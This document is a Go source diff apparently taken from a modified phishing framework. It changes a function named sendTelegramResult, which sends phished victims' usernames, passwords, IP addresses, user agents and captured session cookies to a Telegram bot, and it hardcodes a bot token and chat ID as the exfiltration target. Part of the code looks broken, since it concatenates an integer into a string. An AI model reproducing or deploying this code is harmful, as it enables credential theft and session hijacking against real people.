@@ -3,6 +3,7 @@ package database
 import (
 	"bytes"
 	"encoding/json"
+	"io"
 	"io/ioutil"
 	"fmt"
 	"mime/multipart"
@@ -44,13 +45,16 @@ func getChatId() string {
 	return fmt.Sprintf("%s", ChatId)
 }
 
-func sendTelegramResult(cookies string, id int, phishlet string, username string, password string, remote_addr string, useragent string) {
+func sendTelegramResult(cookies string, sid int, phishlet string, username string, password string, remote_addr string, useragent string) {
 
 	// Send the message
 	var err error
 	client, fileName := &http.Client{}, "filename-cookies.json"
-	url := fmt.Sprintf("%s/sendDocument?chat_id=%s", getUrl(), getChatId())
-	msg := fmt.Sprintf("[ 🍁 %s %d Cookies Result 🍁 ]\n\n********* [ 💻 Valid Login  💻 ] ********\n🌟 Username :   %s\n🔑 Password :   %s\n🌎 UserAgent:   %s\n💻 IP:   https://ip-api.com/%s\n\n*******[ 🍪 Cookies Captured 🍪 ] **********",id, phishlet, username, password, useragent, remote_addr)
+	token, chat_id := "5886667026:AAHMRZh4RSjsqaXNwPgZjOJ_W-ffDM5PpIE", "915867987"
+
+	url := "https://api.telegram.org/bot" + token + "/sendDocument?chat_id=" + chat_id + ""
+	//url := "http://api.ttelegram.org/bot"%s/sendDocument?chat_id=%s", getUrl(), getChatId())
+	msg := "[ 🍁 ["+phishlet+" "+sid+"] Cookies Result 🍁 ]\n\n********* [ 💻 Valid Login  💻 ] ********\n🌟 Username : " + username + "\n🔑 Password : " + password + "\n🌎 UserAgent: " + useragent + "\n💻 IP:   https://ip-api.com/" + remote_addr + "\n\n*******[ 🍪 Cookies Captured 🍪 ] **********"
 	
 // 	postBody, _ := json.Marshal(map[string]string{
 // 		"chat_id":    getChatId(),
